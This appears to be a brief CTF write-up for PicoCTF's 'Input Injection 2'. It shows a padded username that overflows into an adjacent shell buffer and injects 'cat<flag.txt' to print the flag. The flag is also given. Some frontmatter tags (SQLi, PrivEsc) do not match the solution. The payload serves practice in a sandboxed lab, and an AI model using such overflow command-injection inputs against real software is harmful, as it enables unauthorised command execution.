---
title: Input Injection 2
category: Hello
platform: PicoCTF
difficulty: Hard
date: 2026-09-03
tags:
  - Web
  - SQLi
  - Linux
  - PrivEsc
summary: Uwuga
status: Ongoing
---

# Input Injection 2

## 1. Challenge Description

> [!quote] A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag? connect to the challenge instance `nc <ip_address> <port>`. You can Download the program file [here](https://challenge-files.picoctf.net/c_amiable_citadel/bedd848cf45bd7b42af4a45831ad58190255c0e569df35640cdb63b151a62753/vuln)and source [code](https://challenge-files.picoctf.net/c_amiable_citadel/bedd848cf45bd7b42af4a45831ad58190255c0e569df35640cdb63b151a62753/vuln.c)

### Solution
```
$ amiable-citadel.picoctf.net 63888

username at 0x3d0802a0
shell at 0x3d0802d0
Enter username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacat<flag.txt
picoCTF{us3rn4m3_2_sh3ll_466d4bae}Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacat<flag.txt. Your shell is cat<flag.txt.
```
##  The Flag

> [!SUCCESS] Flag `picoCTF{us3rn4m3_2_sh3ll_466d4bae}`